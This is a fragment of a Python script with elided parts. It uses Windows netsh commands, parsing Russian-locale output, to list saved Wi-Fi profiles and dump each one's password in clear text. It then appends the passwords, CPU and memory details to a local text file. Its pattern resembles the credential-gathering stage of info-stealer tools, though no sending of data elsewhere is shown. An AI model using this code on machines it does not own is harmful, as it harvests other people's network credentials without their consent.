...
def main():
    ...
    def extract_wifi_passwords():
        profiles_data=subprocess.check_output('netsh wlan show profiles', encoding='CP866', errors='ignore').split('\n')
        profiles = [i.split(':')[1].strip() for i in profiles_data if 'Все профили пользователей' in i]
        def for_pass():
            arr = ["-------- Wifi Passwords --------"]
            for profile in profiles:
                profile_info=subprocess.check_output(f'netsh wlan show profile {profile} key=clear', encoding='CP866', errors='ignore').split('\n')
                try:
    ...
    memory_information=(f'-------- Memory Information --------\nTotal: {get_size(svmem.total)}\nAvailable: {get_size(svmem.available)}')

    with open(file='full_info.txt', mode='a', encoding='utf-8') as file:
        file.write(f'{extract_wifi_passwords()}\n{cpu_information}\n{memory_information}')
